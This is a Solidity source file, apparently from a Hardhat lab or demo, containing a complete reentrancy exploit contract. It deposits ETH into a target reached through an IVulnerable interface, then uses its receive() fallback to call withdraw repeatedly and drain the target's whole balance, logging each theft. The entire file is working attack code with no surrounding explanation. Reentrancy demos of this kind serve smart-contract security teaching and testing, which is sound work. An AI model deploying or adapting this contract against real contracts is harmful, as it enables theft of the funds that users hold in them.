// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4; 

import "hardhat/console.sol"; // provides a console logging functionality to contract.
import {IVulnerable} from "./IVulnerable.sol"; // interface to access the vulnerable contract functions.

contract Exploit {
    IVulnerable immutable vulnAddr;

    // sets the vulnerable contract address
    constructor(address _vulnAddr) {
        vulnAddr = IVulnerable(_vulnAddr);
    }

    // deposits to the vulnerable contract.
    function deposit() payable public {
        vulnAddr.deposit{value: msg.value }();
        uint256 balBefore = vulnAddr.balanceOf(address(this));
        console.log("[exploit] BALANCE AFTER DEPOSITING THE AMOUNT : ",balBefore);
    }

    // withdraws the amount from vulnerable contract
    function startExploit(uint256 amount) public {
        vulnAddr.withdraw(amount);
    }

    // invoking the reentrancy attack
    receive() external payable {
        require(msg.sender == address(vulnAddr),"allowed from vulnerable contract");
        console.log("[exploit] RECEIVED ETH : ",msg.value);

        uint256 bal = address(vulnAddr).balance;
        if (bal != 0) {
            console.log("[exploit] STEALING BALANCE OF : ",bal);
            vulnAddr.withdraw(bal);
        }
    }
}